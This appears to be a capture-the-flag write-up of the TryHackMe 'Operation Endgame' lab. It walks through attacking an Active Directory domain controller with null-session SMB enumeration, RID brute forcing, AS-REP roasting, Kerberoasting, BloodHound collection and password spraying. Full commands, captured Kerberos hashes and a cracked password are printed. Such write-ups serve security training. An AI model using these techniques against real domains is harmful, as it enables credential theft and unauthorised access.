https://tryhackme.com/room/operationendgame

## Recon

### Port Scan
A full TCP port scan using **Nmap**  identified the target as a Windows-based **Active Directory Domain Controller** for the domain `thm.local`. This is confirmed by the presence of core services such as Kerberos (88), LDAP (389/636), and Global Catalog (3268/3269), which handle authentication and directory operations. A web server running Microsoft IIS 10.0 is exposed on port 80, with the HTTP TRACE method enabled, potentially introducing minor security risks. Additionally, multiple RPC services (135, 593, and dynamic high ports) are open, increasing the system’s attack surface. Other services such as Kerberos password change (464) and Active Directory Web Services (9389) further support the domain controller role. We also have a hint the hostname is `AD` 

```shell
# Nmap 7.98 scan initiated Tue Mar 17 21:28:57 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- --min-rate 5000 -T 5 -oN endgame-ports.txt 10.49.172.50
Warning: 10.49.172.50 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.49.172.50
Host is up (0.22s latency).
Not shown: 57105 closed tcp ports (reset), 8408 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-03-17 18:29:27Z)
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc             Microsoft Windows RPC
49665/tcp open  msrpc             Microsoft Windows RPC
49666/tcp open  msrpc             Microsoft Windows RPC
49667/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  msrpc             Microsoft Windows RPC
49681/tcp open  msrpc             Microsoft Windows RPC
49694/tcp open  msrpc             Microsoft Windows RPC
49726/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 17 21:30:38 2026 -- 1 IP address (1 host up) scanned in 100.57 seconds
```


I then performed SMB enumeration  using NetExec (`nxc smb`) with a null session (`guest` account and empty password). The target system was identified as a Windows 10 / Server 2019 host (Build 17763) within the `thm.local` domain. SMB signing is enabled, and SMBv1 is disabled, indicating adherence to modern security practices. However, **null authentication is permitted**, as the guest account was able to successfully authenticate without a password. This misconfiguration may allow unauthenticated users to enumerate shares, users, and other sensitive domain information.

```bash
nxc smb 10.49.181.137 -u 'guest' -p ''
SMB         10.49.181.137   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.181.137   445    AD               [+] thm.local\guest:
```
### Enumerating shares

```shell
nxc smb 10.49.181.137 -u 'guest' -p '' --shares
SMB         10.49.181.137   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.181.137   445    AD               [+] thm.local\guest:
SMB         10.49.181.137   445    AD               [*] Enumerated shares
SMB         10.49.181.137   445    AD               Share           Permissions     Remark
SMB         10.49.181.137   445    AD               -----           -----------     ------
SMB         10.49.181.137   445    AD               ADMIN$         Remote Admin
SMB         10.49.181.137   445    AD               C$         Default share
SMB         10.49.181.137   445    AD               IPC$            READ         Remote IPC
SMB         10.49.181.137   445    AD               NETLOGON         Logon server share
SMB         10.49.181.137   445    AD               SYSVOL         Logon server share
```

While administrative shares such as `ADMIN$` and `C$` are not accessible, the `IPC$` share is readable, and domain-related shares like `NETLOGON` and `SYSVOL` are visible. These shares are commonly used in Active Directory environments and may contain scripts, policies, or other information useful for further enumeration.

### Generating Hosts File

A hosts file was generated using NetExec with a null session to resolve domain-related hostnames for easier interaction with services.

```shell
nxc smb 10.49.181.137 -u 'guest' -p '' --generate-hosts-file hosts.txt
```

```shell
cat hosts.txt
10.49.181.137     AD.thm.local thm.local AD
```

Let's add the host to hosts file `/etc/hosts`

```shell
echo 'AD.thm.local thm.local AD' | sudo tee -a /etc/hosts
```

### RID Brute Forcing

RID brute forcing is performed using NetExec with a null session to enumerate valid domain users and groups by cycling through Relative Identifiers (RIDs).

```shell
nxc smb 10.49.181.137 -u 'guest' -p '' --rid-brute 10000 > rid-brute.txt
```

Then we proceed to extract User accounts 

```shell
 cat rid-brute.txt | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f2 > users.txt
```

We have a total of  `492` users in the domain.

```shell
wc -l users.txt
492 users.txt
```

### Roasting 
For more information on roasting read [[Roasting]]

#### AS_REP roasting  

```shell
impacket-GetNPUsers thm.local/guest:'' -dc-ip 10.49.181.137 -usersfileusers.txt -request -no-pass -outputfile as-rep.txt
```

We get AS-REP hashes for several users 

```shell
cat as-rep.txt
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:d99205c69bb5e85eaa6d5506da6874ec$c15e2545cf0f2ba14f907ebaa0b2b8c188b3998aa9f53580553648925caa7cdd4bd04f77d73f209e1957e607615c85310b6366b4cd6b9b2058f5f6d394e88c79cf3b7154cb611b62fd9cf55347246c45065dac52015dfa084e3c410f2d11128017a35b8d8a1b3f571ffa429ed99984d0ec9acabf90f03c64609c9d6b3508be1b01a2587452d1353e0a21b4da87dd1f911b54d0848d015c6cb853b4930efd3f9e58f75dfd7f72e1704f102e93a7a013bf0a357a8b93b0fe29145587fcd0854b4c95e27b1fc610fdb5e60d2555edd71a6c1a996ff5d8c506ae25c659655a39471335d61402b004
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:731ad5e8a636b60ebd4f40479badf006$21d43f9a0176a8c1a187d7e56f3be8acc2deafadd35334c116e6fc2c790421cf3542811d09a0b2852e895470673fc6a7dfe751709b393b4b7787cf870f9cd59c725cbaf7bab4e7e2e5775c3309a621b0921f3610f1e5a8e2ca6018601e88a94ca9b7f62cf96f1d3653bee483763b6e22bbf545fa7e0449e2cf1a06f4252034b322390bf99646df316bb11cecae5bbcf8bc00242db3ea0dc89ec44f288b0ca4194d8e6af07d7d739fbdb578732e4c18e15d1119c4a971f70f25d902303732a02cccbe8bf11e8a617c3a22ace634e0299b207332c214efa9cc51a08a194402c5acde3c30cc385b
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:8fd9c537b901f9a39826f6bf724c0a00$091aaf0b4cdd3650506a1fd184801d0767a61937940e98732bcc530124d5d9e48de4801349b486e44e50028a5a2b0362fdddcaf5044fd29014d88071a69a393c54dc88ed256d30bacc7ec1e37aca22ce358efef677f0263f3e5770750de108e3df1bcea08c0feb4a2ba24b8a0b647acd6726966472db98925c1bb8af595e86ae239e2b829acc1f1fd4d147e0a323c14b229ed7524665b6e2931f5c4035bf451371674914d717f06a5bb1789585894b6c58b32bb177a870cc5601315187ba74fdbbee618e67af08d1071a69d73e38796cfd7051a054026d342913a4a3cb879bd1f1e0f00e5dc1
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:86d60579ebe2db64b2cd0ead144ff475$5bdb700b9f7c5fa59ed2c5d5c6d337e2fd43386b4ccf3b31a9b2b27a90f84b3c5521b75009d65072d63c5f097f671dad7605da84b562574747546a80af4fe28ff645ff658999482fad6d8b4659bc4ce5f64e08262d9bc6f40197895a57ccce8eb33b26e19cde049c37fa6c7b1d2bac5e13879e54875fa063be5ebf63d44eee4dd3c74478c2156afa242013967a2252466b7b0f54387b72cdba95be41388923785c8dc69dc5213b2328c53f892a7ac22000c2efbd587b50e7483374589ddc0588440ccdf1af716ce940f505e12c1ac97f826a0a34f7b99f83355f9dcf17bb709072118bf47fad
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:df9ae3f628e9a07094526474f655354b$53120f7b56d53a60b0114f93ed0c885d14627ca69bf42625e1aa7957146886808ebf86a6447809084e9f3fd21590b4adc7bc6a623ebe3132ea2f65fdd792e3ba9d48bc6a7ab07c6c402ae87d64bd6986e0cb235221e8c856090b680eb9279f9d53eb2be7e5339581dbf371064ae2499db64ac3b3481d166351291fd3fc45cbaf8c756f8db007a2d0d1a75f84b6f111c2dda7df79a4f7cf5e75d344b02c520e1a52701112a4b8af5fc5f768b9d1aa5ef5eb5e9d7a9338eae50e20910c178acec032a54ec794ea71c4102f89358be40610e368e5e9cd62b4c6a2d3c4e2f7d119a0d0565eeeeda9
```

But none is crackable

![[Pasted image 20260319101704.png]]

#### Kerberoasting

```shell
impacket-GetUserSPNs thm.local/guest:'' -dc-host AD.thm.local -request-outputfile tgs.txt -no-pass
```

The enumeration reveals the user account `CODY_ROY` associated with the SPN `HTTP/server.secure.com`.

```shell
impacket-GetUserSPNs thm.local/guest:'' -dc-ip 10.49.181.137 -request -outputfile tgs.txt -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName    Name      MemberOf           PasswordLastSet             LastLogon                   Delegation
----------------------  --------  --------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/server.secure.com  CODY_ROY  CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local  2024-05-10 17:06:07.611965  2024-04-24 18:41:18.970113
```

The TGS is crackable

![[Pasted image 20260319102225.png]]

### Domain mapping

I used `rusthound-ce` to collect Active Directory data from the `thm.local` domain. The tool successfully gathers information on users, groups, and permissions, generating output for BloodHound analysis. This data will be used to identify potential attack paths and privilege escalation opportunities within the domain.

```shell
rusthound-ce -u 'guest' -p '' -d thm.local -i 10.49.181.137 -f AD.thm.local --zip
---------------------------------------------------
Initializing RustHound-CE at 10:28:50 on 03/19/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-19T07:28:50Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-19T07:28:50Z INFO  rusthound_ce] Collection method: All
[2026-03-19T07:28:51Z INFO  rusthound_ce::ldap] Connected to THM.LOCAL Active Directory!
[2026-03-19T07:28:51Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-19T07:28:51Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)

[SNIP]
```

`CODY_ROY` has `genericWrite` rights over several users 

![[Pasted image 20260319103626.png]]

The users in the `EVERYONE` group don't seem to have any special rights though all the users are in the following groups 

![[Pasted image 20260319104123.png]]

If we compromise any user form the `Remote Management Users` group we can get access to the host if `Winrm` is enabled.

#### Password Spraying

Proceed to check is `CODY_ROY's` password is being used by another account.

```shell
nxc smb 10.49.181.137 -u users.txt -p 'MKO)mko0' --continue-on-success
```

We get one more user using the same password `ZACHARY_HUNT`